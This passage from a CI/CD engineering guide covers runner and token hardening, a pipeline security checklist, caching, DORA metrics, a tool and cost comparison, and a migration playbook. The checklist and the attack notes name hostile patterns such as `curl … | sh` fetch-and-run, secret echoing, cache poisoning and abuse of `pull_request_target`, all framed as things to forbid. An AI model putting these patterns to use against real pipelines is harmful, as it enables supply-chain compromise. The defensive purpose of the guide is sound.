5. Never run a self-hosted runner as root, and never on a machine with other workloads.
6. Destroy and recreate self-hosted runners on a schedule (the ARC operator does this).
```

```yaml
# ⭐ the ARC (actions-runner-controller) setting that makes self-hosted safe
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
spec:
  template:
    spec:
      ephemeral: true                    # ⭐ one job, then the pod is deleted
      repository: 3558Bhk/shop           # ⭐ a PRIVATE repo
      dockerEnabled: false               # ⭐ no DinD unless you need it
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
```

#### Attack 4 — the artifact/build-cache poisoning

```
An attacker poisons a shared cache or a build artifact in a low-privilege job.
A high-privilege job later restores that cache and executes the poisoned content.
```

**The defences:**
```yaml
# ⭐ scope caches by the branch and by an explicit key — never share a cache
#    between an untrusted (PR) job and a trusted (main) job.
- uses: actions/cache@v4
  with:
    path: ~/.m2
    key: m2-${{ runner.os }}-${{ github.ref_name }}-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      m2-${{ runner.os }}-${{ github.ref_name }}-
      # ⭐ do NOT add a bare `m2-${{ runner.os }}-` fallback — that's how a
      #    PR-branch cache gets restored into a main-branch build.

# ⭐ and validate what you download before executing it
- uses: actions/download-artifact@v4
  with: {name: build-scripts}
- run: |
    # checksum the artifact against a value committed in the repo
    sha256sum -c scripts.sha256 || { echo "⛔ artifact tampered with"; exit 1; }
    chmod +x deploy.sh
```

#### Attack 5 — the over-permissioned token

```yaml
# ⛔ the default GITHUB_TOKEN in a repo with "read/write" permissions can:
#    push to the repo, create releases, delete branches, write packages,
#    create/delete actions, manage environments…
# ⛔ and any step in any job can use it. So one compromised action = repo takeover.

# ✅ set permissions EXPLICITLY, at the workflow AND job level
permissions: {}                    # ⭐⭐ deny everything at the top…
jobs:
  build:
    permissions:
      contents: read               # …then grant only what each job needs
  deploy:
    permissions:
      id-token: write              # OIDC
      contents: read
      packages: write              # to push to GHCR
  comment:
    permissions:
      pull-requests: write         # only this job may comment on PRs
```

```yaml
# Azure DevOps equivalent:
# Project Settings → Pipelines → "Set up the build service account permissions"
# ⭐ restrict the <Project> Build Service to the minimum:
#    · Contribute: DENY on the repo for build-service accounts in PR pipelines
#    · "Limit job authorization scope to current project" → ON
#    · "Limit job authorization scope to referenced Azure DevOps repositories" → ON
```

```groovy
// Jenkins equivalent:
// Manage Jenkins → Security → "Access Control for Builds":
//   · "Project-based Matrix Authorization Strategy" + per-folder permissions
//   ⭐ and the "Authorize Project" plugin, which lets a build run as the
//     user who triggered it rather than as a system account — so a PR from
//     an outsider runs with an OUTSIDER's permissions.
```

### 12.2 The pipeline security checklist

```
REPOSITORY
  □ branch protection on main: required checks, required reviews, no force push
  □ ⭐ CODEOWNERS on the pipeline files — a workflow change needs platform approval
  □ signed commits required (or at least enforced for the deploy branch)
  □ secret scanning + push protection enabled (GitHub Advanced Security / gitleaks)
  □ the lockfiles are committed (package-lock.json, go.sum, poetry.lock, …)

WORKFLOW FILES
  □ third-party actions pinned to a full commit SHA, not a tag or branch
  □ base images pinned by digest, and updated by a bot (Renovate/Dependabot)
  □ `permissions:` set explicitly at the workflow AND job level — least privilege
  □ ⛔ no `${{ github.event.* }}` interpolated directly into a `run:` block
  □ ⛔ no `curl … | sh` from a non-pinned URL
  □ ⛔ no `pull_request_target` + checkout of PR code in the same job
  □ every `if:` condition is correct (a missing `if` on a deploy job is a classic)

SECRETS
  □ ⭐ no long-lived cloud credentials — OIDC / Workload Identity Federation everywhere
  □ production secrets live in ENVIRONMENT scope, not repository scope
  □ the OIDC trust policy's `sub` condition is scoped to a specific repo AND ref
  □ a secret scan runs on every PR and blocks the merge
  □ secrets are rotated on a schedule, and rotation is tested
  □ nobody has `echo $SECRET` in a script step

RUNNERS / AGENTS
  □ ⛔ no self-hosted runner attached to a public repository, ever
  □ self-hosted runners are ephemeral, non-root, on dedicated machines
  □ PR builds from first-time contributors require approval
  □ the runner has no network path to production except through the deploy step
  □ runner images are patched (a schedule, or the ARC operator)

ARTIFACTS
  □ images are signed (cosign) and the signature is verified at admission (Kyverno)
  □ SBOM + provenance attached to every release image
  □ the registry has immutable tags enabled (ACR, ECR, GHCR all support it)
  □ deployment is by DIGEST, never by a mutable tag
  □ caches are scoped per-branch and per-key; no cross-trust-level cache sharing

AUDIT
  □ every production deploy is recorded: who, when, what commit, what approval
  □ pipeline changes are reviewed like code (they ARE code, with root privileges)
  □ you can answer "who could have deployed to production last Tuesday?" from logs
  □ the deploy job's logs are retained (GitHub: 90 days; Azure: configurable; Jenkins: your disk)
```

---

<a name="13--caching-the-only-thing-that-makes-pipelines-fast"></a>
## 13 · Caching — the only thing that makes pipelines fast

A 25-minute pipeline doesn't get used. A 4-minute one does. Caching is usually 60–80% of that difference.

### 13.1 The five cache layers

| Layer | What it caches | Typical saving | Where |
|---|---|---|---|
| **1. Dependencies** | `~/.m2`, `~/.gradle`, `node_modules`, the Go module cache, `~/.cache/pip` | ⭐ 1–4 min | `actions/cache`, `setup-*` built-in cache, the Jenkins Job Cacher plugin |
| **2. Docker layers** | The BuildKit layer cache | ⭐⭐ 2–10 min | `cache-from`/`cache-to` with `type=gha` or a registry |
| **3. Build output** | Compiled objects, incremental builds | 1–5 min | the same dependency cache, or a remote build cache |
| **4. Test state** | Nothing usually — but test *results* for flake detection | — | artifacts |
| **5. The agent itself** | A pre-baked image with the toolchain | ⭐ 5–15 s cold start | a custom runner image / an ARC template |

### 13.2 Dependency caching, in all three

```yaml
# ⭐ GitHub Actions — the setup-* actions cache for you
- uses: actions/setup-java@v5
  with: {java-version: '21', distribution: temurin, cache: maven}     # ⭐ cache: maven
- uses: actions/setup-go@v6
  with: {go-version: '1.23', cache: true, cache-dependency-path: '**/go.sum'}
- uses: actions/setup-node@v5
  with: {node-version: '22', cache: npm, cache-dependency-path: '**/package-lock.json'}
- uses: actions/setup-python@v5
  with: {python-version: '3.13', cache: pip, cache-dependency-path: '**/requirements*.txt'}

# ⭐ and a manual cache for anything else
- uses: actions/cache@v4
  with:
    path: |
      ~/.cache/pip
      ~/.cargo/registry
      ~/go/pkg/mod
      .next/cache
    key: ${{ runner.os }}-deps-${{ hashFiles('**/requirements.txt', '**/Cargo.lock', '**/go.sum') }}
    restore-keys: ${{ runner.os }}-deps-
    enableCrossOsArchive: false
    lookup-only: false                 # ⭐ true = check existence without downloading
    save-always: false
# ⚠️ cache limits: 10 GB per repository, evicted after 7 days without access.
# ⚠️ caches are BRANCH-SCOPED: a cache created on a PR branch is not readable
#    from main (and vice versa) — which is also the security property from §12.
```

```yaml
# ⭐ Azure DevOps — the Cache task (or the built-in caching in some tasks)
variables:
  MAVEN_CACHE: $(Pipeline.Workspace)/.m2
steps:
  - task: Cache@2
    displayName: Cache Maven
    inputs:
      key: 'maven | "$(Agent.OS)" | $(Build.SourcesDirectory)/pom.xml'
      restoreKeys: 'maven | "$(Agent.OS)"'
      path: $(MAVEN_CACHE)
      cacheHitVar: CACHE_RESTORED
  - script: mvn -B -Dmaven.repo.local=$(MAVEN_CACHE) verify
    condition: and(succeeded(), ne(variables.CACHE_RESTORED, 'true'))
# ⚠️ Azure DevOps cache: 10 GB free per organisation, per-project scoping.
```

```groovy
// ⭐ Jenkins — three options, best first:
// 1. a PERSISTENT VOLUME on a Kubernetes agent (fastest, but stateful)
// 2. the Job Cacher plugin (archives to S3/Artifactory, restores per build)
// 3. a plain workspace on a sticky agent (⚠️ state leaks between builds)

// option 1: the Kubernetes agent template with a PVC
agent {
  kubernetes {
    yaml '''
      apiVersion: v1
      kind: Pod
      spec:
        containers:
          - name: maven
            image: maven:3.9-eclipse-temurin-21
            command: ["sleep"]
            args: ["infinity"]
            volumeMounts:
              - {name: m2, mountPath: /root/.m2}
        volumes:
          - name: m2
            persistentVolumeClaim: {claimName: jenkins-maven-cache}
    '''
  }
}

// option 2: the Job Cacher plugin
cache(caches: [
  arbitraryFileCache(path: "~/.m2/repository", includes: "**/*",
                     cacheValidityDecidingFile: "pom.xml")
]) {
  sh 'mvn -B verify'
}
```

### 13.3 Docker layer caching ⭐⭐ the biggest single win

```yaml
# ⭐ GitHub Actions: the GHA cache backend
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    context: apps/shop-api
    push: true
    tags: ${{ steps.meta.outputs.tags }}
    labels: ${{ steps.meta.outputs.labels }}
    cache-from: type=gha,scope=shop-api          # ⭐ SCOPE IT per image, or every
    cache-to: type=gha,mode=max,scope=shop-api   #    build overwrites the others'
    provenance: mode=max                          # ⭐ SLSA provenance
    sbom: true                                    # ⭐ the SBOM attestation
    build-args: |
      VERSION=${{ github.sha }}
      OTEL_AGENT_VERSION=2.11.0

# ⭐ the registry backend (better for self-hosted runners; no 10 GB limit)
    cache-from: type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache
    cache-to: type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache,mode=max
```

```yaml
# ⭐ Azure DevOps
- task: Docker@2
  displayName: Build and push
  inputs:
    command: buildAndPush
    containerRegistry: shop-acr
    repository: shop-api
    Dockerfile: apps/shop-api/Dockerfile
    buildContext: apps/shop-api
    tags: |
      $(Build.SourceVersion)
      latest
    arguments: >
      --cache-from shopacr.azurecr.io/shop-api:buildcache
      --cache-to type=registry,ref=shopacr.azurecr.io/shop-api:buildcache,mode=max
      --build-arg VERSION=$(Build.SourceVersion)
```

```groovy
// ⭐ Jenkins
stage('Build image') {
  steps {
    script {
      def img = docker.build("shopacr.azurecr.io/shop-api:${env.GIT_COMMIT}",
        "--cache-from shopacr.azurecr.io/shop-api:buildcache " +
        "--build-arg VERSION=${env.GIT_COMMIT} " +
        "apps/shop-api")
      docker.withRegistry('https://shopacr.azurecr.io', 'acr-creds') {
        img.push()
        img.push('buildcache')      // ⭐ refresh the cache ref
      }
    }
  }
}
```

**The Dockerfile must be cache-friendly.** Order the layers from *least* to *most* frequently changing:

```dockerfile
# ⛔ BAD — every source change invalidates the dependency download
FROM maven:3.9-eclipse-temurin-21 AS build
WORKDIR /src
COPY . .                      # ⛔ any file change busts the cache
RUN mvn -B package

# ✅ GOOD — dependencies are cached as long as pom.xml doesn't change
FROM maven:3.9-eclipse-temurin-21 AS build
WORKDIR /src
COPY pom.xml .
RUN mvn -B dependency:go-offline         # ⭐ CACHED until pom.xml changes
COPY src ./src
RUN mvn -B -DskipTests package

FROM eclipse-temurin:21-jre-alpine AS runtime
COPY --from=build /src/target/app.jar /app/app.jar
```

```bash
# measure the effect — record the numbers, they're the interview proof
for i in 1 2 3; do
  /usr/bin/time -f "cold build %e s" docker build --no-cache -t x apps/shop-api 2>&1 | tail -1
  /usr/bin/time -f "warm build %e s" docker build          -t x apps/shop-api 2>&1 | tail -1
done
# cold build 187.4 s
# warm build  24.1 s        ⭐ 87% faster. That's the whole argument for caching.
```

### 13.4 The other big levers

```
⭐ 1. PATH FILTERING — don't build what didn't change
     on: pull_request: paths: ['src/**', 'pom.xml']
     or use dorny/paths-filter to set an output, then `if:` the jobs on it.
     A docs-only PR should cost ZERO minutes.

⭐ 2. CONCURRENCY CANCELLATION — kill superseded runs
     concurrency: {group: ci-${{ github.ref }}, cancel-in-progress: true}
     Push 5 commits in a minute → only the last one builds. Often 40% of minutes.

⭐ 3. PARALLELISE — separate jobs, not sequential steps
     Four services in one job = 12 min. Four jobs in parallel = 4 min.

⭐ 4. SPLIT THE WORKFLOW — a fast PR loop and a slow main loop
     PR:  lint + unit + build + scan        (~6 min)
     main: + integration + e2e + deploy     (~25 min)

⭐ 5. BIGGER RUNNERS — pay for 8 CPUs instead of 2
     A Maven build that takes 6 min on 2 CPUs often takes 90 s on 8.
     The maths usually works: 4× the per-minute cost for 4× the speed, but
     you also stop paying for the queue wait.

⭐ 6. SKIP WHAT'S ALREADY DONE — content-addressed builds
     if the image digest for this exact source already exists in the registry,
     don't rebuild it. `docker buildx imagetools inspect` first.

⭐ 7. A REMOTE BUILD CACHE for the compilers
     Bazel/Gradle/Nx/Turborepo remote caches: a 40-min build becomes a 2-min
     cache hit. This is the highest-leverage change for a monorepo.
```

---

<a name="14--dora-metrics-measuring-your-pipeline"></a>
## 14 · DORA metrics: measuring your pipeline

You can't improve what you don't measure, and "our pipeline feels slow" isn't a measurement.

### 14.1 The four (five) metrics

| Metric | Definition | Elite | High | Medium | Low |
|---|---|---|---|---|---|
| ⭐ **Deployment frequency** | How often you deploy to production | On demand (multiple per day) | Weekly → monthly | Monthly → every 6 months | Every 6+ months |
| ⭐ **Lead time for changes** | Commit → running in production | < 1 hour | 1 day → 1 week | 1 → 6 months | 6+ months |
| ⭐ **Change failure rate** | % of production deploys causing an incident | 0–15% | 16–30% | 16–30% | 46–60% |
| ⭐ **Time to restore (MTTR)** | Incident start → service restored | < 1 hour | < 1 day | < 1 week | 1 week → 6 months |
| **Reliability** (the 5th, added 2023) | Does the service meet its SLOs? | meets/exceeds | — | — | misses |

```
⭐ THE TRADE-OFF THAT MAKES DORA INTERESTING:
   The first two (speed) and the last two (stability) LOOK like they conflict.
   Elite performers are better at BOTH. That's the finding. Speed and stability
   are not a trade-off — they're both outcomes of good engineering:
     small batches, fast feedback, loose coupling, automated testing,
     automated deployment, and ⭐ observability good enough to restore fast.
```

### 14.2 Measuring them from your pipeline

```bash
# ⭐ DEPLOYMENT FREQUENCY — count production deploys per day
# GitHub Actions:
gh api -X GET "repos/3558Bhk/shop/actions/workflows/deploy-production.yml/runs?per_page=100" \
  --jq '.workflow_runs[] | select(.conclusion=="success") | .updated_at' \
  | cut -dT -f1 | sort | uniq -c
#    3 2026-09-08
#    7 2026-09-09      ← 7 production deploys yesterday
#    2 2026-09-10

# ⭐ LEAD TIME — the commit timestamp to the successful deploy timestamp
gh api "repos/3558Bhk/shop/actions/runs/$RUN_ID" --jq '{
  commit_sha: .head_sha,
  started:    .run_started_at,
  finished:   .updated_at,
  duration_s: ((.updated_at|fromdate) - (.run_started_at|fromdate))
}'
# and the FULL lead time = commit authored_at → deploy updated_at:
git show -s --format=%cI $SHA          # when the commit was authored
gh api "repos/3558Bhk/shop/commits/$SHA" --jq '.commit.author.date'

# ⭐ CHANGE FAILURE RATE — deploys followed by an incident within 24h
# the honest way: join the deploy log against your incident log.
# the automated way: count deploys that were followed by a ROLLBACK.
kubectl argo rollouts get rollout shop-api -n shop -o json | jq '.status.abortedAt'
helm history shop -n shop | awk '$NF ~ /rolled back|failed/ {print}'

# ⭐ MTTR — from your incident tool. Not from CI.
```

```yaml
# ⭐ emit the metrics AS Prometheus metrics from the pipeline itself
- name: Record the DORA metrics
  if: always()
  run: |
    cat > /tmp/dora.prom <<EOF
    # HELP cicd_deployment_total Number of deployments.
    # TYPE cicd_deployment_total counter
    cicd_deployment_total{env="production",service="shop-api",result="${{ job.status }}"} 1
    # HELP cicd_pipeline_duration_seconds Pipeline duration.
    # TYPE cicd_pipeline_duration_seconds histogram
    cicd_pipeline_duration_seconds_bucket{env="production",stage="total",le="600"} 1
    cicd_pipeline_duration_seconds_sum{env="production",stage="total"} ${{ env.DURATION }}
    cicd_pipeline_duration_seconds_count{env="production",stage="total"} 1
    # HELP cicd_lead_time_seconds Commit-to-production lead time.
    # TYPE cicd_lead_time_seconds gauge
    cicd_lead_time_seconds{env="production",service="shop-api"} ${{ env.LEAD_TIME }}
    EOF
    curl -XPOST --data-binary @/tmp/dora.prom \
      "$PUSHGATEWAY/metrics/job/cicd/instance/$GITHUB_RUN_ID"
# ⭐ then a Grafana dashboard gives you the DORA metrics for free, and you can
#    alert on a regression in lead time — which is how a slow pipeline gets fixed.
```

```promql
# deployment frequency (per day, last 30 days)
sum(increase(cicd_deployment_total{env="production",result="success"}[1d]))

# median lead time
quantile(0.5, cicd_lead_time_seconds{env="production"})

# the p90 pipeline duration — the number your engineers actually feel
histogram_quantile(0.9, sum by (le) (rate(cicd_pipeline_duration_seconds_bucket[7d])))

# change failure rate
sum(increase(cicd_deployment_total{env="production",result="failure"}[30d]))
  / sum(increase(cicd_deployment_total{env="production"}[30d]))

# ⭐ and the FLAKY TEST rate — the leading indicator of a pipeline nobody trusts
sum(increase(cicd_test_flaky_total[7d])) / sum(increase(cicd_test_total[7d]))
```

### 14.3 The pipeline-health dashboard

```
┌────────────────────────────────────────────────────────────────────────┐
│  CI/CD HEALTH                                          last 30 days ▾  │
├────────────────────────────────────────────────────────────────────────┤
│  Deploy frequency     Lead time (p50)   Change failure   MTTR          │
│      4.2 / day            38 min             6.1%        42 min        │
│      ⭐ ELITE             ⭐ ELITE           ✅ HIGH      ✅ HIGH       │
├────────────────────────────────────────────────────────────────────────┤
│  Pipeline duration p50 / p90 by workflow                               │
│  ─────────────────────────────────────                                 │
│  ci.yml             ████░░░░░░  4m12s / 9m40s                          │
│  deploy-staging     ██░░░░░░░░  2m08s / 3m15s                          │
│  deploy-production  █████░░░░░  5m44s / 11m02s                         │
├────────────────────────────────────────────────────────────────────────┤
│  Failure rate by stage          ⭐ where to invest                      │
│  ─────────────────────                                                 │
│  lint        0.4%                                                      │
│  unit        3.1%                                                      │
│  build       1.2%                                                      │
│  scan        0.8%                                                      │
│  integration 7.4%   ← ⭐ the problem area                              │
│  e2e        14.2%   ← ⭐⭐ probably flaky, see below                    │
├────────────────────────────────────────────────────────────────────────┤
│  Flaky tests (failed then passed on the same commit)                   │
│  ─────────────────────────────────────────                             │
│  OrderRetryTest.retriesAfterTimeout      11 failures / 30 days  🔴     │
│  PlaywrightCheckoutTest.appliesCoupon     7 failures / 30 days  🟠     │
├────────────────────────────────────────────────────────────────────────┤
│  Cache hit rate:  dependencies 94%  ·  docker layers 71%               │
│  Minutes consumed: 4,812 this month  ·  cancelled-superseded: 1,204    │
└────────────────────────────────────────────────────────────────────────┘
```

---

<a name="15--choosing-a-tool-the-honest-comparison"></a>
## 15 · Choosing a tool: the honest comparison

### 15.1 What each one is genuinely best at

**Azure DevOps**
```
✅ the best built-in governance of the three: Environments with approvals,
   branch control, required templates, business hours, REST-API checks
✅ ⭐ Boards + Repos + Pipelines + Artifacts + Test Plans in ONE product.
   A commit links to a work item links to a build links to a release links
   to a test result. No other tool does this end-to-end out of the box.
✅ Workload Identity Federation for Azure — zero secrets, GA, Microsoft-recommended
✅ the `deployment:` job with canary/rolling/runOnce strategies built in
✅ Azure Artifacts with UPSTREAM SOURCES (a proxy + cache for npmjs/Maven Central/
   NuGet/PyPI) — genuinely excellent, and it protects you from an upstream outage
✅ Test Plans: manual test cases, exploratory testing sessions, traceability
⛔ YAML that is more verbose than GitHub's and with three variable syntaxes
   ($(var), ${{ variables.var }}, $[variables.var]) that confuse everyone
⛔ the marketplace is much smaller than GitHub's
⛔ outside the Microsoft ecosystem it feels heavy
```

**GitHub Actions**
```
✅ ⭐ THE MARKETPLACE. 30,000+ actions. If a tool exists, someone packaged it.
✅ the best developer experience: the workflow file lives next to the code,
   `gh run watch` in your terminal, annotations inline on the PR diff
✅ ⭐ GHCR + GITHUB_TOKEN works with zero configuration — build and push an
   image in a PR from a fork-adjacent branch without a single secret
✅ OIDC to every cloud is a first-class, one-line feature
✅ reusable workflows + composite actions = excellent DRY at scale
✅ free and unlimited for public repositories
✅ the runner images are the same ones Azure Pipelines uses
⛔ ⭐ NO STAGES. You emulate them with `needs:` + `environment:`, and you lose
   the visual "gate" that Azure and Jenkins give you for free.
⛔ the expression language (`${{ }}`) has surprising evaluation-order rules
   and a real script-injection footgun (§12)
⛔ artifact retention and cache limits (10 GB) bite large monorepos
⛔ self-hosted runners are your problem (the ARC operator helps a lot)
⛔ matrix jobs don't easily pass aggregated results to a dependent job
```

**Jenkins**
```
✅ ⭐ TOTAL FLEXIBILITY. Groovy is a real programming language: loops, conditionals,
   functions, error handling, libraries. If you can imagine it, you can pipeline it.
✅ ⭐ the Kubernetes plugin: ephemeral agents created per build, with a different
   container per stage, scaling to hundreds of pods, costing nothing when idle.
   This is still the best agent story in CI, eight years on.
✅ 1,800+ plugins — it integrates with systems that no SaaS CI has ever heard of
✅ on-prem, air-gapped, and fully offline operation (a hard requirement for many)
✅ ⭐ Shared Libraries: a versioned Groovy library of pipeline steps that every
   team imports. This is genuine platform engineering.
✅ free, and you own every byte of it
⛔ ⭐⭐ YOU OPERATE IT. Upgrades, plugin compatibility, security patches, disk,
   backups, the controller's single point of failure. Budget 0.2–0.5 FTE.
⛔ plugin hell: 40 plugins with interdependencies and mismatched versions
⛔ Groovy's sandbox: the Script Security approval queue, and the fact that a
   malicious Jenkinsfile can call controller-side plugin steps
⛔ no built-in environments, approvals-as-objects, or deployment history
⛔ the UI (even Blue Ocean) feels dated next to the other two
⛔ ⭐ Java 21 minimum since LTS 2.555.1 — if your controller is on Java 17,
   you cannot upgrade to a current LTS
```

### 15.2 The decision table

| Your situation | Choose | Why |
|---|---|---|
| Code is on GitHub, team < 50, shipping often | ⭐ **GitHub Actions** | Zero friction, biggest ecosystem, free for public |
| A Microsoft/Azure shop, and you use Boards | ⭐ **Azure DevOps** | The commit→work-item→build→release→test traceability is unmatched |
| Regulated: need approvals, audit, deployment windows as first-class objects | ⭐ **Azure DevOps** | Environments + checks are the richest of the three |
| On-prem, air-gapped, or no cloud allowed | ⭐ **Jenkins** | The only one that runs entirely inside your walls |
| Extreme customisation, legacy systems, mainframes, SAP, embedded | ⭐ **Jenkins** | Groovy + 1,800 plugins |
| A platform team serving 50+ app teams | ⭐ **Jenkins shared libraries** or **GH reusable workflows** | Both work; pick the one matching your existing stack |
| Very high build volume, need burst capacity cheaply | ⭐ **Jenkins on Kubernetes** | Ephemeral agents, scale-to-zero |
| You need manual test management too | ⭐ **Azure DevOps** | Test Plans is a real product |
| A monorepo with remote build caching | Bazel/Nx/Turbo + any of the three | The cache matters more than the CI |

### 15.3 Cost, honestly

```
Assumption: 30 engineers, ~4,000 pipeline runs/month, ~1,200 build-minutes/day.

GITHUB ACTIONS (private repo, Team plan)
  included:      3,000 min/month + 2 GB artifact storage
  overage:       $0.008/min (Linux), $0.016 (Windows), $0.08 (macOS)
  1,200 min/day × 30 = 36,000 min − 3,000 = 33,000 × $0.008 = $264/month
  larger runners (2× for 10% of jobs):                         + $180
  ⭐ TOTAL:                                                    ~$450/month
  ⭐ free and unlimited for PUBLIC repos — which is why OSS uses it

AZURE DEVOPS
  included:      1 free Microsoft-hosted parallel job (1,800 min/month)
  extra parallel jobs: $40/month each, unlimited minutes       ⭐ the key difference
  30 engineers need ~6–8 parallel jobs = $240–320/month FLAT
  ⭐ TOTAL:                                                    ~$320/month
  ⭐ but Azure Boards/Test Plans licensing adds per-user cost at scale
  ⭐ the FLAT-RATE parallel job model is dramatically cheaper at high volume
     than GitHub's per-minute model. Above ~15,000 min/month, Azure wins.

JENKINS
  software:      $0
  infrastructure: a 4 CPU / 16 GB controller        ~$120/month
                  + Kubernetes agents at ~6 pods avg  ~$180/month
                  + artifact storage (S3/Artifactory) ~$50/month
  ⭐ ENGINEERING TIME: 0.2–0.5 FTE to operate        $2,000–5,000/month
  ⭐ TOTAL:                                            ~$2,400–5,400/month
  ⭐⭐ THE HONEST NUMBER. Jenkins is "free" only if nobody's time is free.
     It becomes worth it when: you need air-gapped/on-prem, you need extreme
     customisation, or you need >100,000 min/month of burst capacity where
     the per-minute pricing of the SaaS options exceeds the ops cost.
```

> 🔑 **The interview answer:** *"Jenkins' total cost of ownership is dominated by engineering time, not infrastructure — roughly 0.2 to 0.5 FTE for upgrades, plugin compatibility and security. It's the right choice when you need on-prem or air-gapped operation, extreme customisation via Groovy, or burst capacity large enough that per-minute SaaS pricing exceeds that ops cost. Azure DevOps' flat-rate parallel jobs make it the cheapest SaaS option above roughly 15,000 minutes a month. GitHub Actions is the cheapest below that, and free for public repos, and has by far the largest ecosystem — but it has no stage concept, so you emulate gates with `needs:` and environments."*

---

<a name="16--migrating-between-tools"></a>
## 16 · Migrating between tools

### 16.1 What actually moves, and what doesn't

| Layer | Portable? | Effort |
|---|---|---|
| **The build itself** (`mvn verify`, `go test`, `docker build`) | ✅ **100%** | Zero — it's a shell command |
| **The Dockerfile, Helm chart, k8s manifests** | ✅ 100% | Zero |
| **The tests** | ✅ 100% | Zero |
| **The scripts** (`scripts/deploy.sh`, `scripts/smoke-test.sh`) | ✅ 100% | Zero — ⭐ put logic in scripts, not in YAML |
| **The pipeline YAML/Groovy** | ❌ | ⭐ A rewrite. 1–3 weeks per complex pipeline |
| **Secrets and service connections** | ❌ | Re-create; use it as the chance to move to OIDC |
| **Build history and artifacts** | ⚠️ Partially | Usually not worth migrating |
| **Approvals, environments, deployment history** | ❌ | Re-create |
| **The team's muscle memory** | ❌ | ⭐ The real cost. 1–3 months of frustration |

⭐ **The architectural rule that makes migration cheap: keep the intelligence in SCRIPTS, not in the pipeline definition.**

```yaml
# ⛔ 200 lines of tool-specific YAML that must be rewritten
steps:
  - task: Docker@2
    inputs: {command: build, arguments: '--build-arg A=1 --build-arg B=2 …', …}
  - task: AzureCLI@2
    inputs: {inlineScript: |
       az aks get-credentials …
       helm upgrade --install … --set a=1 --set b=2 …
       kubectl rollout status …
       if [[ $? -ne 0 ]]; then helm rollback …; fi }

# ✅ 12 lines that survive any migration
steps:
  - run: ./scripts/build-image.sh  "$SERVICE" "$VERSION"
  - run: ./scripts/deploy.sh       "$ENVIRONMENT" "$DIGEST"
  - run: ./scripts/smoke-test.sh   "$ENVIRONMENT"
```

The shell scripts are the same in Azure DevOps, GitHub Actions and Jenkins. Only the *invocation* changes.

### 16.2 The migration playbook

```
PHASE 0 — INVENTORY (week 1)
  □ list every pipeline/job, its trigger, its duration, its failure rate,
    and whether anyone still uses it. ⭐ Delete the dead ones FIRST — typically
    20–40% of them. That's the cheapest win in the whole migration.
  □ identify the SHARED logic: what does every pipeline do? That becomes your
    reusable workflow / template / shared library in the new tool.
  □ find the pipelines that use tool-specific features with no equivalent
    (Azure DevOps deployment strategies, Jenkins' Kubernetes agents).
    Those are your risks. Write them down.
  □ export everything: the YAML/Groovy, the variable groups, the service
    connections (names and scopes, NOT values), the environments, the schedules.

PHASE 1 — THE VERTICAL SLICE (week 2–3)
  □ pick ONE representative service — not the simplest, not the hardest
  □ build the full pipeline in the new tool: lint → test → build → scan → push
    → deploy dev → smoke → staging → approve → production
  □ ⭐ run BOTH pipelines in parallel. The old one still deploys.
  □ compare: same artifact digest? same test results? same duration?
  □ write down every difference. This is your migration guide for the rest.

PHASE 2 — THE SHARED LAYER (week 3–4)
  □ build the reusable component FIRST, before migrating in bulk:
      GitHub Actions:  a reusable workflow (workflow_call) + composite actions
      Azure DevOps:    YAML templates (extends templates for security)
      Jenkins:         a shared library (vars/*.groovy)
  □ ⭐ the shared layer is where you fix the mistakes the old pipelines had.
    Don't port the bad patterns — that's the whole opportunity.
  □ include in it: the OIDC auth, the caching, the SBOM/signing, the scanning,
    the deploy script call, the smoke test, the DORA metric emission.

PHASE 3 — MIGRATE IN WAVES (weeks 5–10)
  □ wave 1: the simple services (5–10), using the shared layer
  □ wave 2: the medium ones
  □ wave 3: the hard ones — the ones with custom agents, special hardware,
    legacy integrations
  □ ⭐ each service runs BOTH pipelines until the new one has deployed to
    production successfully 3 times. Then decommission the old one.
  □ migrate the team, not just the config: pair each team with someone who's
    already migrated. Run a workshop on the shared layer.

PHASE 4 — DECOMMISSION (weeks 11–12)
  □ make the old pipelines READ-ONLY first (disable triggers), then delete
  □ rotate every credential the old system held. ⭐⭐ Don't skip this — the old
    system's secrets are now unmanaged.
  □ revoke the old system's cloud access (delete the service principal, the
    IAM user, the deploy key)
  □ archive the build history if compliance requires it
  □ update the runbooks, the on-call docs, and the "how do I ship?" page

PHASE 5 — THE PARITY PROOF ⭐
  □ re-run the acceptance criteria from the monitoring path's game day:
    deploy a bad version and verify the new pipeline ROLLS BACK
    deploy a good version and verify the smoke test passes
    verify the approval gate actually blocks
    verify the OIDC role can't be assumed from a PR branch
  □ ⭐ a migration is done when the new pipeline has caught a real bug that
    the old one would have caught. Until then, it's unproven.
```

### 16.3 The feature-gap translations

| I need… | Azure DevOps | GitHub Actions | Jenkins |
|---|---|---|---|
| A stage gate | `stages:` + `dependsOn:` | ⭐ `needs:` + `environment:` | `stages:` (native) |
| Manual approval | Environment → Approvals | Environment → Required reviewers | the `input` step |
| A deployment window | Environment → Business hours check | ⚠️ no native equivalent — a `wait-for` step or a scheduled workflow | a `when { expression }` time check |
| Canary deployment | ⭐ `strategy: canary:` on a deployment job | Argo Rollouts / Flagger (external) | Argo Rollouts / Flagger (external) |
| Run another pipeline as a gate | Environment → Required templates | `workflow_run` (⚠️ awkward) or a reusable workflow | `build job:` |
| Reusable steps | ⭐ YAML templates (`extends`) | composite actions + reusable workflows | ⭐ shared libraries |
| A matrix | `strategy: matrix:` | `strategy: matrix:` | `matrix { axes { } }` |
| Pass data between jobs | output variables + `##vso[task.setvariable]` | `$GITHUB_OUTPUT` + `needs.x.outputs.y` | a `script { return … }` or a file |
| An artifact | `publish:` / `download:` | `upload-artifact` / `download-artifact` | `archiveArtifacts` / `copyArtifacts` |
| A build cache | `Cache@2` | `actions/cache@v4` + the `setup-*` cache inputs | the Job Cacher plugin / a PVC |
| Publish test results | ⭐ `PublishTestResults@2` + Boards integration | `dorny/test-reporter` or annotations | ⭐ the JUnit plugin (excellent) |
| Code coverage | ⭐ `PublishCodeCoverageResults@2` | a third-party action or a PR comment | the JaCoCo plugin |
| A container registry | `Docker@2` + an ACR service connection | ⭐ `docker/login-action` + `GITHUB_TOKEN` (zero config for GHCR) | `docker.withRegistry` |
| Kubernetes deploy | `Kubectl@1` / `HelmDeploy@0` + a service connection | `azure/k8s-set-context` + `kubectl` | ⭐ the Kubernetes plugin (the best of the three) |
